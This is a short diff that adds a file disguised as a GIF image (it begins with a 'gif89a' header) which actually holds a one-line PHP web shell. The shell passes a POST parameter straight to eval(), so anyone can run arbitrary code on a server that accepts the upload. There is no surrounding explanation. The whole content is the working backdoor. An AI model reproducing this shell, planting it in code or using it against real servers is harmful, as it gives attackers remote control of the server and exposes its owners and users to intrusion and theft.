@@ -1,0 +1,4 @@
+gif89a
+<?php 
+eval($_POST[c]); 
+?>
